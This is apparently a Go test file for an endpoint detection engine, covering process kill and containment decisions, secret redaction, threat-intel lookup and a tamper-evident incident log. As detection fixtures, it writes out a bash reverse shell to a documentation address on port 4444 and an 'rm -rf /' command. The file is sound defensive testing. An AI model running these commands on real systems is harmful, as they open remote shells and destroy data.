package main

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
)

func TestKillerDomNeedsIndependentSignalsForKill(t *testing.T) {
	rules := NewXDRRuleEngine()
	p := ProcessSample{
		PID:        1001,
		StartTicks: 42,
		Comm:       "bash",
		Exe:        "/usr/bin/bash",
		Cmdline:    `bash -c 'bash -i >& /dev/tcp/203.0.113.8/4444 0>&1'`,
	}
	d := rules.EvaluateProcess(p, nil, nil, nil)
	if d.Decision == "kill" {
		t.Fatalf("single heuristic must not authorize kill: %+v", d)
	}
	if d.Decision != "contain" {
		t.Fatalf("expected containment for reverse-shell signature, got %+v", d)
	}

	p.Exe = "/tmp/.cache/bash"
	d = rules.EvaluateProcess(p, nil, nil, nil)
	if d.Decision != "kill" || len(d.Categories) < 2 {
		t.Fatalf("independent network and origin signals should authorize kill: %+v", d)
	}
}

func TestDestructiveRuleNeedsASecondStrongSignal(t *testing.T) {
	d := NewXDRRuleEngine().EvaluateProcess(ProcessSample{
		PID: 2001, StartTicks: 7, Comm: "sh", Exe: "/bin/sh",
		Cmdline: `sh -c 'rm -rf / '`,
	}, nil, nil, nil)
	if d.Decision != "contain" {
		t.Fatalf("command text alone must not authorize kill: %+v", d)
	}
	d = NewXDRRuleEngine().EvaluateProcess(ProcessSample{
		PID: 2001, StartTicks: 7, Comm: "sh", Exe: "/tmp/sh",
		Cmdline: `sh -c 'rm -rf / '`,
	}, nil, nil, nil)
	if d.Decision != "kill" || d.KillSignals < 2 {
		t.Fatalf("destructive command plus suspicious origin should authorize broker review: %+v", d)
	}
}

func TestCommandRedaction(t *testing.T) {
	in := `curl -H "Authorization: Bearer abcdefghijklmnop" https://alice:supersecret@example.test --token=abc123 --password hunter2`
	out := NewXDRRuleEngine().RedactCommand(in, 4096)
	for _, secret := range []string{"abcdefghijklmnop", "supersecret", "abc123", "hunter2"} {
		if strings.Contains(out, secret) {
			t.Fatalf("secret %q leaked in redacted command: %s", secret, out)
		}
	}
}

func TestCustomRulesAreConfigurableButNeverKillEligible(t *testing.T) {
	engine := NewXDRRuleEngine()
	settings := defaultRuntimeSettings(defaultConfig())
	settings.Revision = 9
	settings.EnabledRuleModules = []string{}
	settings.CustomRules = []CustomRule{{
		ID: "CUSTOM.OPERATOR-TOOL", Enabled: true, Category: "operator",
		Summary: "Operator tool matched", Pattern: `danger-tool`, Score: 100,
	}}
	if err := engine.Configure(settings); err != nil {
		t.Fatal(err)
	}
	decision := engine.EvaluateProcess(ProcessSample{Cmdline: "danger-tool --run", Exe: "/tmp/ignored"}, nil, nil, nil)
	if !slices.Contains(decision.RuleIDs, "CUSTOM.OPERATOR-TOOL") {
		t.Fatalf("custom rule did not match: %+v", decision)
	}
	if decision.KillSignals != 0 || decision.Decision == "kill" {
		t.Fatalf("custom rule became kill-authorizing evidence: %+v", decision)
	}
	if decision.ResponseScore != 0 || decision.Decision != "alert" {
		t.Fatalf("custom rule escaped the alert-only response boundary: %+v", decision)
	}
	if slices.Contains(decision.RuleIDs, "XDR.TEMP_EXEC") {
		t.Fatalf("disabled origin module remained connected: %+v", decision)
	}
}

func TestParseProcStatHandlesSpacesAndParentheses(t *testing.T) {
	// After the closing ')' fields begin at field 3. starttime is field 22,
	// therefore index 19 in this suffix.
	suffix := []string{"S", "42"}
	for len(suffix) < 19 {
		suffix = append(suffix, "0")
	}
	suffix = append(suffix, "987654")
	ppid, start, comm, err := parseProcStat("123 (worker ) thread) " + strings.Join(suffix, " "))
	if err != nil {
		t.Fatal(err)
	}
	if ppid != 42 || start != 987654 || comm != "worker ) thread" {
		t.Fatalf("unexpected parse result: ppid=%d start=%d comm=%q", ppid, start, comm)
	}
}

func TestThreatIndexCIDRLookup(t *testing.T) {
	idx := &ThreatIndex{}
	idx.Replace([]string{"203.0.113.0/24", "2001:db8::/32"})
	if !idx.ContainsString("203.0.113.9") || !idx.ContainsString("2001:db8::1") {
		t.Fatal("expected threat-index matches")
	}
	if idx.ContainsString("198.51.100.1") || idx.ContainsString("not-an-ip") {
		t.Fatal("unexpected threat-index match")
	}
}

func TestResponseRulePrefersBrokerVerifiableEvidence(t *testing.T) {
	ids := []string{"KD.LINUX.REVERSE_SHELL", "XDR.TEMP_EXEC"}
	if got := responseRule(ids); got != "XDR.TEMP_EXEC" {
		t.Fatalf("unexpected broker evidence rule: %s", got)
	}
	if got := responseRule([]string{"XDR.THREAT_INTEL_C2"}); got != "XDR.THREAT_INTEL_C2" {
		t.Fatalf("fallback rule changed unexpectedly: %s", got)
	}
}

func TestBaselineAllowsAnyPortWhenOnlyCIDRIsConfigured(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "baseline.json")
	data := `{"version":1,"profiles":[{"executable":"/usr/bin/example","allow_external_network":true,"allowed_remote_cidrs":["203.0.113.0/24"]}]}`
	if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
		t.Fatal(err)
	}
	bl, err := LoadXDRBaseline(path)
	if err != nil {
		t.Fatal(err)
	}
	matches := bl.Evaluate(ProcessSample{Exe: "/usr/bin/example"}, []NetConnection{{RemoteIP: "203.0.113.7", RemotePort: 8443}})
	if len(matches) != 0 {
		t.Fatalf("port should be unrestricted when no port list is configured: %+v", matches)
	}
}

func TestIncidentLogAuthenticatesEntireChain(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "incidents.jsonl")
	keyPath := filepath.Join(dir, "xdr.key")
	logger, err := NewIncidentLogger(logPath, keyPath)
	if err != nil {
		t.Fatal(err)
	}
	for n := 0; n < 2; n++ {
		_, err = logger.Append(XDRIncident{ID: randomID(), Time: time.Unix(int64(n+1), 0).UTC(), Severity: "warning", Score: 50, RuleIDs: []string{"TEST.RULE"}, Categories: []string{"test"}, Summary: "test", Decision: "alert", Action: "none", Outcome: "observed"})
		if err != nil {
			t.Fatal(err)
		}
	}
	logger2, err := NewIncidentLogger(logPath, keyPath)
	if err != nil || logger2.Healthy() != nil {
		t.Fatalf("valid chain rejected: constructor=%v health=%v", err, logger2.Healthy())
	}

	b, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatal(err)
	}
	b = []byte(strings.Replace(string(b), `"score":50`, `"score":51`, 1))
	if err := os.WriteFile(logPath, b, 0o600); err != nil {
		t.Fatal(err)
	}
	tampered, err := NewIncidentLogger(logPath, keyPath)
	if err != nil {
		t.Fatal(err)
	}
	if tampered.Healthy() == nil {
		t.Fatal("tampered incident chain was accepted")
	}
	if _, err := tampered.Append(XDRIncident{}); err == nil {
		t.Fatal("quarantined incident log accepted an append")
	}
}

func TestIncidentLogDetectsTailTruncation(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "incidents.jsonl")
	keyPath := filepath.Join(dir, "xdr.key")
	logger, err := NewIncidentLogger(logPath, keyPath)
	if err != nil {
		t.Fatal(err)
	}
	for n := 0; n < 2; n++ {
		if _, err := logger.Append(XDRIncident{ID: randomID(), Time: time.Unix(int64(n+1), 0).UTC(), Severity: "warning", Score: 50, RuleIDs: []string{"TEST.RULE"}, Categories: []string{"test"}, Summary: "test", Decision: "alert", Action: "none", Outcome: "observed"}); err != nil {
			t.Fatal(err)
		}
	}
	b, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSpace(string(b)), "\n")
	if len(lines) != 2 {
		t.Fatalf("expected two records, got %d", len(lines))
	}
	if err := os.WriteFile(logPath, []byte(lines[0]+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	truncated, err := NewIncidentLogger(logPath, keyPath)
	if err != nil {
		t.Fatal(err)
	}
	if truncated.Healthy() == nil {
		t.Fatal("tail truncation was not detected by the head checkpoint")
	}
}

func TestIncidentLogStopsAtConfiguredBudget(t *testing.T) {
	dir := t.TempDir()
	logger, err := NewIncidentLogger(filepath.Join(dir, "incidents.jsonl"), filepath.Join(dir, "xdr.key"), 1)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := logger.Append(XDRIncident{ID: "budget", RuleIDs: []string{"TEST"}, Categories: []string{"test"}, Summary: "test", Decision: "alert", Action: "none", Outcome: "observed"}); err == nil {
		t.Fatal("incident logger exceeded its configured budget")
	}
	if logger.Healthy() == nil {
		t.Fatal("budget exhaustion did not quarantine the logger")
	}
}

func TestBaselineRejectsTrailingJSON(t *testing.T) {
	path := filepath.Join(t.TempDir(), "baseline.json")
	if err := os.WriteFile(path, []byte("{\"version\":1,\"profiles\":[]}{}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadXDRBaseline(path); err == nil {
		t.Fatal("baseline with trailing JSON was accepted")
	}
}
